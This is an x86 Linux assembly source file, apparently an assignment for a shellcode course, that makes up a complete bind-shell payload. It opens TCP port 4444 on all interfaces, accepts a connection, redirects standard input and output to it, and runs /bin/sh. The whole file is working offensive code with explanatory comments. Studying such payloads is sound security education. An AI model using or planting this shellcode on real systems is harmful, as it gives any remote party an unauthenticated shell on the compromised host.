; Filename: bind.nasm
; Author:  Alex
; SLAE-ID: SLAE-1046
; Website:  http://0xdeadcode.se
;
; Purpose: Assignment 1 - SLAE Exam
; 	   Bind Shell 

global _start			

section .text
_start:

	; int socketcall(int call, unsigned long *args) from man page
	; int sock = socket(AF_INET, SOCK_STREAM, 0)    from bind shell code
	; SOCK_STREAM is represented by 1
	; AF_INET is represented by 2
	; push args on stack (in reverse order)
	; put selected call (socket = 1) in ebx
	; put syscall hex(nr) in eax

	xor eax, eax
	xor ebx, ebx
	xor edi, edi
	push eax		; push 0 to stack
	inc eax
	push eax		; push 1 to stack (SOCK_STREAM)
	inc eax
	push eax		; push 2 to stack (AF_INET)

	mov al, 0x66		; socketcall (102 dec is 0x66)
	mov bl, 0x1		; socket()
	mov ecx, esp		; pointer to the arguments we pushed
	int 0x80		; syscall
	mov edx, eax		; save return value

	; socketcall for sys_bind
	; bind(sock,(struct sockaddr*)&addr, sizeof(addr));
	; edx contain pointer to sock

	xor eax, eax
	push eax		; push zeroes for our bind address (0.0.0.0)
	push word 0x5c11	; push port number 4444 in reverse
	push word 0x2		; AF_INET = 2
	mov ecx, esp		; store stack address
	push 0x10		; length of the sockaddr struct (decimal 16)
	push ecx		; saved stack pointer
	push edx		; saved socket pointer
	mov al, 0x66		; socketcall
	inc bl			; bl is 0x1, inc 1. sys_bind = 2
	mov ecx, esp		; pointer to our args	
	int 0x80		; syscall

	; socketcall for sys_listen
	; listen(sock, 1)
	
	push byte 0x1		; 1 client only
	push edx		; pointer to socket
	mov al, 0x66		; socketcall
	add bl, 0x2		; bl is 0x2, add 0x2 to value. sys_listen = 4
	mov ecx, esp		; pointer to our args
	int 0x80		; syscall

	; socketcall for sys_accept
	; accept(sock, (struct sockaddr*) NULL, NULL);
	xor ecx, ecx		; zero ecx to keep data in eax and ebx
	push ecx		; NULL
	push ecx		; NULL
	push edx		; pointer to socket
	mov al, 0x66		; socketcall
	inc ebx			; ebx is now 0x5, which is sys_accept
	mov ecx, esp		; pointer to args
	int 0x80		; syscall

	; point stdin, stdout and stderr to our new socket
	; return value from last syscall is in eax, need update
	; from linux man pages: int dup2(int oldfd, int newfd)
	; eax should be 0x3f, ebx oldfd, ecx newfd
	; currently eax hold our connected clients socket
	; edx is the socket we created at start
	
	mov ecx, edx		; move socket into ecx (newfd)
	mov ebx, eax		; move client socket into ebx (oldfd)

	loc_loop:
	mov al, 0x3f		; dup2 req. eax being 0x3f
	int 0x80		; syscall
	dec ecx			; decrease ecx (socket newfd)
	jns loc_loop		; jump if loop ain't done (ecx != 0)
	
	; execve /bin/sh
	; int execve(const char *filename, char *const argv[], char *const envp[]);
 	; execve("/bin/sh", argv, NULL);
	; eax should contain 0xb 
	
	push edi		; register is 0x0 at this time. push null on stack
	mov al, 0xb		; sys_execve (decimal 11)
	push 0x68732f2f		; hs//
	push 0x6e69622f		; nib/
	mov ebx, esp		; save pointer to /bin/sh
 	push edi		; register is 0x0 at this time. push null on stack
	mov edx, esp		; move pointer to null into edx
 	push ebx		; push pointer to /bin/sh onto stack
	mov ecx, esp		; move stack pointer to ecx
 	int 0x80 		; syscall
 
